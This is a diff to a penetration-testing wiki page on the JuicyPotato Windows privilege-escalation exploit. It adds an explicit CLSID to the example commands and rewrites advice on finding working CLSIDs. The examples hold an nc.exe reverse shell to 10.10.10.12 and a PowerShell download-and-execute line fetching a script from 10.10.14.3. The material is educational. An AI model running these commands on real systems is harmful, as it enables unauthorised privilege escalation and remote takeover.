@@ -70,11 +70,13 @@ From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
 ## Examples
 
+Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.
+
 ### Get a nc.exe reverse shell
 
 ```text
-c:\Users\Public>JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
-JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *                                                                                
+c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 ......
 [+] authresult 0
@@ -88,7 +90,7 @@ c:\Users\Public>
 ### Powershell rev
 
 ```text
-.\jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
+.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
 
 ### Launch a new CMD \(if you have RDP access\)
@@ -97,13 +99,10 @@ c:\Users\Public>
 
 ## CLSID Problems
 
-If you can't find **any working CLSID** you should visit this page:
+Oftentimes, the default CLSID that JuicyPotato uses **doesn't work** and the exploit fails. Usually, it takes multiple attempts to find a **working CLSID**. To get a list of CLSIDs to try for a specific operating system, you should visit this page:
 
 {% embed url="https://ohpe.it/juicy-potato/CLSID/" %}
 
-There you can **find** some **CLSID that you could** use instead of the default one to privesc.
-
-**You could also try to find other working CLSID.**
 
 ### **Checking CLSIDs**
 
